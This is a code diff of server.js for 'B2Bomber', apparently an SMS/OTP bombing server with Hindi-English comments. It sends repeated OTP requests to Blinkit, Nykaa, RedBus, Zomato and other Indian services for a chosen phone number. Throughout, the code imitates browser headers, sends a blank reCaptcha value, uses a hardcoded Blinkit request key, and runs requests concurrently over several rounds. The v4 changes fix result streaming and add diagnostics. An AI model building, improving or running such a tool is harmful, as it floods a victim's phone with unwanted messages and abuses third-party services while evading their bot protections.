@@ -1,7 +1,8 @@
 /* =====================================================================
- *  B2Bomber — server.js  [FIXED v3]
- *  v3: round-major scheduling (result turant), dead-skip,
- *      /api/selftest, browser-like headers, hard timeout.
+ *  B2Bomber — server.js  [v4 — STREAM FIX]
+ *  v4: res.on('close') fix (results ab actually client tak jaate hain),
+ *      /api/diag outbound test, per-result url + body snippet,
+ *      round-major scheduling, hard timeout, no-store html.
  * ===================================================================== */
 
 import express from 'express';
@@ -15,7 +16,6 @@ const ROOT = path.resolve(__dirname, '..');
 process.on('uncaughtException', (e) => console.error('[uncaught]', e));
 process.on('unhandledRejection', (e) => console.error('[unhandled]', e));
 
-/* impit optional — na mile to native fetch */
 let impit = null;
 try {
   const mod = await import('impit');
@@ -31,7 +31,7 @@ const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
 
 /* ------------------------------- CONFIG ------------------------------- */
 const PORT        = process.env.PORT || 3000;
-const TIMEOUT_MS  = Number(process.env.TIMEOUT_MS || 7000);
+const TIMEOUT_MS  = Number(process.env.TIMEOUT_MS || 6000);
 const CONC        = Number(process.env.CONC || 12);
 const BENCH_AFTER = 3;
 const BENCH_MS    = 10 * 60 * 1000;
@@ -40,7 +40,6 @@ const BENCH_MS    = 10 * 60 * 1000;
 const FORM  = { 'Content-Type': 'application/x-www-form-urlencoded' };
 const JSONH = { 'Content-Type': 'application/json' };
 const qs    = (o) => new URLSearchParams(o).toString();
-
 const CH_UA = '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"';
 
 function hdr(origin, extra) {
@@ -51,9 +50,6 @@ function hdr(origin, extra) {
     'sec-ch-ua': CH_UA,
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
     'Origin': origin,
     'Referer': origin + '/',
     ...extra,
@@ -69,8 +65,10 @@ function normalize(raw) {
 }
 
 const benchWorthy = (s) => s === 0 || s === 404 || s >= 500;
+/* inpe dobara try karne ka fayda nahi — rounds skip */
+const pointlessRetry = (s) =>
+  s === 0 || s === 400 || s === 401 || s === 403 || s === 404 || s === 405 || s === 422 || s >= 500;
 
-/* HARD timeout — impit signal ignore kare to bhi chale */
 function withTimeout(p, ctrl, ms) {
   let t;
   const killer = new Promise((_, rej) => {
@@ -95,19 +93,22 @@ async function request(url, opts = {}) {
   return { status: r.status, ok: r.ok, text };
 }
 
+/* last attempt ka url bhi return karta hai — debug ke liye */
 async function tryAll(attempts) {
-  let last = { status: 0, text: '', error: 'no attempt' };
+  let last = { status: 0, text: '', error: 'no attempt', url: attempts[0] && attempts[0].url };
   for (const a of attempts) {
     try {
       const r = await request(a.url, a);
-      last = r;
-      if (!benchWorthy(r.status)) return r;
+      last = { ...r, url: a.url };
+      if (!benchWorthy(r.status)) return last;
     } catch (e) {
-      last = { status: 0, text: '', error: String(e.message || e) };
+      last = { status: 0, text: '', error: String(e.message || e), url: a.url };
     }
   }
   return last;
 }
+
+const snippetOf = (t) => String(t || '').replace(/\s+/g, ' ').trim().slice(0, 160);
 
 /* --------------------------- BENCH (auto-skip) ------------------------ */
 const benchState = new Map();
@@ -131,37 +132,41 @@ function L(id) {
 }
 
 /* =====================================================================
- *  SERVICES — naya add karna ho to template:
- *  { id:'merasite', name:'Mera Site', attempts: (p) => [
- *      { url:'https://merasite.com/api/otp', method:'POST',
- *        headers: hdr('https://merasite.com', FORM), body: qs({ mobile: p.ten }) } ] },
+ *  SERVICES
  * ===================================================================== */
 
 const BLINKIT_REQ_KEY = 'c0e6868e-1180-400c-be51-f473479f1f0a';
 let blinkitCache = { key: null, at: 0 };
+let blinkitPending = null;
 
 async function blinkitAuth() {
   if (blinkitCache.key && Date.now() - blinkitCache.at < 25 * 60 * 1000) return blinkitCache.key;
-  const r = await request('https://blinkit.com/v2/accounts/auth_key/', {
-    headers: hdr('https://blinkit.com', { req_key: BLINKIT_REQ_KEY }),
-  });
-  let key = null;
-  try { key = JSON.parse(r.text).auth_key; } catch (_) {}
-  if (!key) throw new Error('blinkit auth_key nahi mila (status ' + r.status + ')');
-  blinkitCache = { key, at: Date.now() };
-  return key;
+  if (blinkitPending) return blinkitPending;
+  blinkitPending = (async () => {
+    try {
+      const r = await request('https://blinkit.com/v2/accounts/auth_key/', {
+        headers: hdr('https://blinkit.com', { req_key: BLINKIT_REQ_KEY }),
+      });
+      const key = JSON.parse(r.text).auth_key;
+      if (!key) throw new Error('auth_key nahi mila (status ' + r.status + ')');
+      blinkitCache = { key, at: Date.now() };
+      return key;
+    } finally { blinkitPending = null; }
+  })();
+  return blinkitPending;
 }
 
 const SERVICES = [
-  /* ------------------------- VERIFIED ------------------------- */
   { id: 'blinkit', name: 'Blinkit', verified: true,
     send: async (p, ctx) => {
       const key = ctx.blinkitKey || (ctx.blinkitKey = await blinkitAuth());
-      return request('https://blinkit.com/v2/accounts/', {
+      const url = 'https://blinkit.com/v2/accounts/';
+      const r = await request(url, {
         method: 'POST',
         headers: hdr('https://blinkit.com', { ...FORM, req_key: BLINKIT_REQ_KEY, auth_key: key, device_id: 'web' }),
         body: qs({ user_phone: p.plus }),
       });
+      return { ...r, url };
     } },
   { id: 'nykaa', name: 'Nykaa', verified: true,
     attempts: (p) => [
@@ -177,8 +182,6 @@ const SERVICES = [
       { url: 'https://www.redbus.in/rpw/api/sendOtpV2', method: 'POST',
         headers: hdr('https://www.redbus.in', JSONH), body: JSON.stringify({ phone: p.cc, reCaptchaResponse: '' }) },
     ] },
-
-  /* ------------------------ BEST EFFORT ------------------------ */
   { id: 'zomato', name: 'Zomato', attempts: (p) => [
       { url: 'https://www.zomato.com/php/otp.php', method: 'POST',
         headers: hdr('https://www.zomato.com', FORM), body: qs({ mobile_number: p.ten }) },
@@ -257,19 +260,21 @@ app.use(express.json({ limit: '256kb' }));
 
 const STATIC_DIRS = [path.join(__dirname, 'public'), path.join(ROOT, 'public'), __dirname, ROOT];
 for (const d of STATIC_DIRS) {
-  try { if (fs.existsSync(d)) app.use(express.static(d)); } catch (_) {}
+  try { if (fs.existsSync(d)) app.use(express.static(d, { etag: false, maxAge: 0 })); } catch (_) {}
 }
 
 app.get('/', (_req, res) => {
+  res.set('Cache-Control', 'no-store');
   for (const d of STATIC_DIRS) {
     const f = path.join(d, 'index.html');
     if (fs.existsSync(f)) return res.sendFile(f);
   }
-  res.type('html').send('<h1>B2Bomber API live</h1><p>/api/services</p>');
+  res.type('html').send('<h1>B2Bomber API live</h1><p>/api/diag</p>');
 });
 
 app.get('/api/health', (_req, res) => {
   const benched = SERVICES.filter(s => isBenched(s.id)).length;
+  res.set('Cache-Control', 'no-store');
   res.json({
     ok: true, impit: !!impit, up: Math.round(process.uptime()),
     services: SERVICES.length, live: SERVICES.length - benched, benched,
@@ -287,11 +292,29 @@ app.get('/api/services', (_req, res) => {
   })));
 });
 
-app.get('/api/stats', (_req, res) => {
-  res.json(SERVICES.map(s => ({ id: s.id, name: s.name, ...L(s.id) })));
+/* ---------- DIAG: outbound internet chal raha hai ya nahi ---------- */
+app.get('/api/diag', async (_req, res) => {
+  const tests = [
+    { name: 'ipify',        url: 'https://api.ipify.org?format=json' },
+    { name: 'cloudflare',   url: 'https://www.cloudflare.com/cdn-cgi/trace' },
+    { name: 'google-204',   url: 'https://www.google.com/generate_204' },
+    { name: 'blinkit-auth', url: 'https://blinkit.com/v2/accounts/auth_key/', extra: { req_key: BLINKIT_REQ_KEY } },
+    { name: 'nykaa',        url: 'https://www.nykaa.com/' },
+  ];
+  const out = [];
+  for (const t of tests) {
+    const t0 = Date.now();
+    try {
+      const r = await request(t.url, { headers: hdr(new URL(t.url).origin, t.extra || {}) });
+      out.push({ name: t.name, status: r.status, ms: Date.now() - t0, snippet: snippetOf(r.text) });
+    } catch (e) {
+      out.push({ name: t.name, status: 0, ms: Date.now() - t0, error: String(e.message || e) });
+    }
+  }
+  res.json({ impit: !!impit, node: process.version, timeoutMs: TIMEOUT_MS, conc: CONC, outbound: out });
 });
 
-/* ---------- DIAGNOSTIC: ek service ko live test karo ---------- */
+/* ---------- DIAG: ek service ko live test ---------- */
 app.get('/api/test/:id', async (req, res) => {
   const svc = SERVICES.find(s => s.id === req.params.id);
   if (!svc) return res.status(404).json({ error: 'service nahi mila' });
@@ -300,25 +323,26 @@ app.get('/api/test/:id', async (req, res) => {
   try {
     const r = svc.send ? await svc.send(p, {}) : await tryAll(svc.attempts(p, {}));
     res.json({ id: svc.id, status: r.status, ok: r.ok, ms: Date.now() - t0,
-               body: String(r.text || '').slice(0, 300) });
+               url: r.url || null, snippet: snippetOf(r.text), error: r.error || null });
   } catch (e) {
     res.json({ id: svc.id, status: 0, ok: false, ms: Date.now() - t0, error: String(e.message || e) });
   }
 });
 
-/* ---------- DIAGNOSTIC: saare services ek saath test ---------- */
+/* ---------- DIAG: saare services ek saath ---------- */
 app.get('/api/selftest', async (req, res) => {
   const p = normalize(req.query.number || '9999999999');
   const out = await Promise.all(SERVICES.map(async (svc) => {
     const t0 = Date.now();
     try {
       const r = svc.send ? await svc.send(p, {}) : await tryAll(svc.attempts(p, {}));
-      return { id: svc.id, status: r.status, ok: r.status > 0 && r.status < 400, ms: Date.now() - t0 };
+      return { id: svc.id, name: svc.name, status: r.status, ok: r.status > 0 && r.status < 400,
+               ms: Date.now() - t0, url: r.url || null, snippet: snippetOf(r.text), error: r.error || null };
     } catch (e) {
-      return { id: svc.id, status: 0, ok: false, ms: Date.now() - t0, error: String(e.message || e) };
+      return { id: svc.id, name: svc.name, status: 0, ok: false, ms: Date.now() - t0, error: String(e.message || e) };
     }
   }));
-  res.json({ impit: !!impit, number: p.ten, up: out.filter(o => o.ok).length, total: out.length, results: out });
+  res.json({ impit: !!impit, number: p.ten, ok: out.filter(o => o.ok).length, total: out.length, results: out });
 });
 
 async function bomb(req, res) {
@@ -344,22 +368,30 @@ async function bomb(req, res) {
   }
 
   res.setHeader('Content-Type', 'application/x-ndjson; charset=utf-8');
-  res.setHeader('Cache-Control', 'no-cache');
+  res.setHeader('Cache-Control', 'no-cache, no-transform');
   res.setHeader('X-Accel-Buffering', 'no');
   res.setHeader('Connection', 'keep-alive');
   if (typeof res.flushHeaders === 'function') res.flushHeaders();
 
+  /* ================== YE HI BUG THA ==================
+     req.on('close') body padhte hi fire hota hai.
+     res.on('close') sirf client disconnect / response end pe. */
   let closed = false;
-  req.on('close', () => { closed = true; });
-  const w = (o) => { if (!closed) res.write(JSON.stringify(o) + '\n'); };
+  res.on('close', () => { closed = true; });
+  res.on('error', (e) => { console.error('[res error]', e.message); closed = true; });
+
+  const w = (o) => {
+    if (closed || res.writableEnded) return;
+    try { res.write(JSON.stringify(o) + '\n'); }
+    catch (e) { console.error('[write]', e.message); }
+  };
 
   const total = list.length * rounds;
   w({ type: 'start', phone: p.ten, services: list.length, repeat: rounds, total, skipped: skippedIds.length });
+  console.log(`[bomb] ${p.ten} services=${list.length} repeat=${rounds} total=${total}`);
 
   const beat = setInterval(() => w({ type: 'ping', t: Date.now() }), 4000);
 
-  /* ROUND-MAJOR: pehle sabhi services ka round 1, phir round 2 ...
-     isse pehla result turant aata hai, ek service ke peeche poora wait nahi */
   const tasks = [];
   for (let r = 1; r <= rounds; r++) for (const svc of list) tasks.push({ svc, r });
 
@@ -367,12 +399,13 @@ async function bomb(req, res) {
   const dead = new Set();
   let done = 0, okTotal = 0, failTotal = 0;
 
-  const emit = (svc, round, status, ok, ms, note) => {
+  const emit = (svc, round, status, ok, ms, note, url, snip) => {
     const s = L(svc.id);
     w({
       type: 'result',
       id: svc.id, name: svc.name,
       status, ok, ms, round,
+      url: url || '', snippet: snip || '',
       note: note || '', error: note || '',
       sent: okTotal, failed: failTotal,
       done, total,
@@ -383,10 +416,12 @@ async function bomb(req, res) {
 
   const runOne = async (svc, round) => {
     const t0 = Date.now();
-    let status = 0, error = null;
+    let status = 0, error = null, url = null, snip = '';
     try {
       const r = svc.send ? await svc.send(p, ctx) : await tryAll(svc.attempts(p, ctx));
       status = r.status || 0;
+      url = r.url || null;
+      snip = snippetOf(r.text);
       if (status === 0 && r.error) error = r.error;
       if (benchWorthy(status)) markFail(svc.id); else markOk(svc.id);
     } catch (e) {
@@ -400,22 +435,20 @@ async function bomb(req, res) {
     if (ok) { s.ok++; okTotal++; } else { s.failed++; failTotal++; }
     done++;
 
-    /* network timeout = mehnga (7s). Pehle round me hi fail hua to baaki
-       rounds skip kar do, taaki 250 requests 200 second na lein */
-    if (status === 0 && round === 1) dead.add(svc.id);
+    if (round === 1 && pointlessRetry(status)) dead.add(svc.id);
 
-    emit(svc, round, status, ok, ms, error);
+    emit(svc, round, status, ok, ms, error, url, snip);
+    console.log(`[result] ${svc.id} r${round} status=${status} ok=${ok} ${ms}ms ${error || ''}`);
   };
 
   let i = 0;
   const workers = Array.from({ length: Math.max(1, Math.min(CONC, tasks.length)) }, async () => {
     while (i < tasks.length && !closed) {
       const t = tasks[i++];
-
       if (dead.has(t.svc.id)) {
         const s = L(t.svc.id);
         s.sent++; s.failed++; failTotal++; done++;
-        emit(t.svc, t.r, 0, false, 0, 'skip (round 1 me fail)');
+        emit(t.svc, t.r, 0, false, 0, 'skip (round 1 fail)', '', '');
         continue;
       }
       await runOne(t.svc, t.r);
@@ -424,6 +457,7 @@ async function bomb(req, res) {
   await Promise.all(workers);
 
   clearInterval(beat);
+  console.log(`[bomb done] ${p.ten} sent=${okTotal} failed=${failTotal} of ${total}`);
 
   w({
     type: 'done',
